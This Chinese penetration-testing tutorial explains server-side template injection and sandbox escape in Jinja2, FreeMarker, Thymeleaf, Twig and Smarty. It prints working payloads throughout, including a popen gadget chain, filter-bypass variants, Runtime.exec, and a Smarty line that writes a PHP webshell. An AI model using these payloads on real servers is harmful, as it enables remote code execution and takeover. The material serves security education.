---
title: "服务端模板注入(SSTI)沙箱逃逸技术"
date: 2026-06-12T13:22:57+08:00
draft: false
weight: 70
description: "围绕服务端模板注入(SSTI)沙箱逃逸技术相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "Web安全", "SSTI", "服务端模板注入(SSTI)沙箱逃逸技术"]
---

# 服务端模板注入(SSTI)沙箱逃逸技术

**服务端模板注入（Server-Side Template Injection, SSTI）** 是一种随着现代 Web 框架（如 Python 的 Flask/Django，Java 的 Spring，PHP 的 Twig）普及而兴起的高危漏洞。当应用将用户输入直接作为模板内容进行渲染时，攻击者可以注入模板引擎的专有语法，不仅能读取敏感数据，更可通过沙箱逃逸（Sandbox Escape）直击底层操作系统，实现 RCE。

本文将深度剖析主流模板引擎（Jinja2、FreeMarker、Twig 等）的底层机制与沙箱逃逸实战技巧。

---

## 1. SSTI 漏洞的成因与识别

与 XSS 不同，XSS 是在客户端（浏览器）渲染，而 SSTI 是在服务端渲染。
**漏洞成因**：开发者错误地将用户输入拼接到模板字符串中，而不是将其作为变量传入模板。
例如（Python Flask）：
```python
# 错误写法（产生 SSTI）
template = "<h1>Welcome %s</h1>" % request.args.get('name')
render_template_string(template)

# 正确写法（安全）
render_template("index.html", name=request.args.get('name'))
```

**识别与探测**：
向参数输入 `{{7*7}}` 或 `${7*7}`。如果返回页面中包含 `49`，则明确存在模板引擎解析。
红队通常使用特定的探测序列来确定具体的模板引擎：
*   `${7*7}` -> `49` -> 可能是 FreeMarker (Java) 或 Smarty (PHP)
*   `{{7*7}}` -> `49` -> 可能是 Jinja2 (Python) 或 Twig (PHP)
*   `<%= 7*7 %>` -> `49` -> 可能是 ERB (Ruby)

---

## 2. Python Jinja2 / Tornado 沙箱逃逸

Python 体系下的 SSTI 是最为经典的沙箱逃逸场景。由于 Python 的万物皆对象特性，我们可以通过魔术方法顺藤摸瓜，从一个普通的字符串对象一路爬升到系统模块（`os` / `subprocess`）。

### 2.1 逃逸利用链 (Gadget Chain)
以字符串 `""` 为起点，寻找执行系统命令的类：
1.  **获取所属类**：`"".__class__` (返回 `<class 'str'>`)
2.  **获取基类**：`"".__class__.__mro__[1]` (返回 `<class 'object'>`)
3.  **获取所有子类**：`"".__class__.__mro__[1].__subclasses__()` (返回环境中加载的所有类的列表)
4.  **寻找利用类**：在子类列表中寻找包含 `__builtins__`、可以调用 `os` 或 `eval` 的类。常用的跳板类有：
    *   `<class 'os._wrap_close'>` (包含 `popen`)
    *   `<class 'warnings.catch_warnings'>` (可导入 `sys` 模块)

### 2.2 实战 Payload 构造
假设我们通过脚本遍历，发现 `os._wrap_close` 位于子类列表的第 132 位。我们可以构造如下 Payload 实现 RCE：
```python
{{ "".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}
```

### 2.3 WAF 绕过技巧
*   **过滤了 `__class__` 或 `.`**：
    利用 `attr()` 过滤器或 `[]` 获取属性：
    `""['__class__']` 或 `""|attr("__class__")`
*   **过滤了单/双引号**：
    利用 `request.args` 传参：
    `{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.cmd1](request.args.cmd2).read() }}&cmd1=popen&cmd2=id`
*   **过滤了 `_` (下划线)**：
    利用 Hex 或 Unicode 编码配合 `request.args` 绕过。

---

## 3. Java FreeMarker / Thymeleaf 注入

Java 的模板引擎通常拥有严格的安全限制，但一旦配置不当，依然会被撕破防线。

### 3.1 FreeMarker RCE
FreeMarker 提供了一个内置的 `freemarker.template.utility.Execute` 类，可以用于执行系统命令。
**Payload**：
```ftl
<#assign ex="freemarker.template.utility.Execute"?new()> 
${ex("id")}
```
如果内置的新建对象功能（`?new`）被禁用，红队可以尝试寻找应用上下文中暴露的 Spring Bean（如 `request`, `response`）进行反射调用。

### 3.2 Thymeleaf 表达式注入
Thymeleaf 广泛应用于 Spring Boot 中。如果模板路径可控，或者模板内容中使用了 `__${...}__` 预处理语法，攻击者可以通过 Spring EL (SpEL) 表达式实现代码执行。
**SpEL RCE Payload**：
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
由于 Thymeleaf 较新版本的限制，有时需要通过反射结合字符拼接绕过类加载黑名单。

---

## 4. PHP Twig / Smarty 注入

PHP 模板引擎的沙箱逃逸相对直接，通常围绕全局变量与内置函数展开。

### 4.1 Twig (常用于 Symfony 框架)
Twig 早期版本允许通过 `_self` 全局变量获取环境对象，进而调用过滤器注册函数执行代码。
**Payload (Twig 1.x)**：
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```
**Payload (Twig 3.x 绕过)**：利用 `map` 或 `filter` 配合箭头函数，或调用应用暴露的其他危险函数。

### 4.2 Smarty
Smarty 支持使用 `{php}` 标签直接写 PHP 代码，但现代版本默认禁用。如果启用了危险标签或未禁用静态类调用，可通过反射执行。
**Payload**：
```smarty
{Smarty_Internal_Write_File::writeFile("shell.php", "<?php eval($_POST[cmd]); ?>", self::clearConfig())}
```

---

## 5. 总结

服务端模板注入（SSTI）将传统的“代码与数据分离”原则彻底打破。它的本质是**受限环境下的元编程（Metaprogramming）攻击**。
无论是 Python 的对象继承链、Java 的 SpEL 反射，还是 PHP 的环境劫持，SSTI 都在向安全人员证明：当开发者给予用户渲染界面的画笔时，如果不加上沙箱的枷锁，这支画笔也能轻易改写底层系统的命运。